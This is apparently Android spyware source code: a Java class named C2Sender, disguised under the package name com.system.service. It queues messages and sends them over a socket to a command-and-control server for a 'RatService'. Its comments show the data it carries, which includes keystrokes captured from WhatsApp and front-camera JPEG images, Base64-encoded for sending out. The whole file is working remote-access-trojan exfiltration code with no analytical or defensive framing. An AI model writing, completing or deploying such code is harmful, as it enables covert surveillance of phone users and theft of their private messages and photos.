package com.system.service;

import android.util.Base64;
import android.util.Log;

import java.io.DataOutputStream;
import java.io.IOException;
import java.net.Socket;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.LinkedBlockingQueue;

/**
 * Shared send layer for all modules.
 * Uses a persistent queue — if the socket is down, messages buffer and
 * flush automatically when RatService reconnects.
 *
 * Text:  C2Sender.send("[KEY] pkg=com.whatsapp delta=hello")
 * Binary:C2Sender.sendBytes("[IMG_FRONT]", jpeg_bytes)
 *                → sends as Base64 line so the C2 can decode it
 */
public class C2Sender {

    private static final String TAG   = "C2Sender";
    private static final int    MAX_Q = 1000; // drop oldest when full

    // Queue shared with RatService — RatService sets the socket reference
    static volatile DataOutputStream writer = null;

    private static final LinkedBlockingQueue<String> queue =
        new LinkedBlockingQueue<>(MAX_Q);

    private static final ExecutorService executor =
        Executors.newSingleThreadExecutor();

    static {
        // Drain queue thread — runs forever
        executor.submit(() -> {
            while (true) {
                try {
                    String msg = queue.take(); // blocks until something arrives
                    DataOutputStream out = writer;
                    if (out != null) {
                        out.writeBytes(msg + "\n");
                        out.flush();
                    }
                    // If writer is null: message is lost (already removed from queue)
                    // Could re-add here but that risks infinite loop on bad socket
                } catch (InterruptedException | IOException e) {
                    Log.d(TAG, "send error: " + e.getMessage());
                    writer = null;
                }
            }
        });
    }

    // ── Text payload ──────────────────────────────────────────────
    public static void send(String msg) {
        if (!queue.offer(msg)) {
            // Queue full — drop oldest, insert new
            queue.poll();
            queue.offer(msg);
        }
    }

    // ── Binary payload (JPEG, audio, file) ───────────────────────
    // Format: "[TAG] b64=<base64data>"
    public static void sendBytes(String tag, byte[] data) {
        String b64 = Base64.encodeToString(data, Base64.NO_WRAP);
        send(tag + " b64=" + b64);
    }

    // ── Called by RatService when socket connects/disconnects ─────
    static void set_writer(DataOutputStream out) {
        writer = out;
    }
}
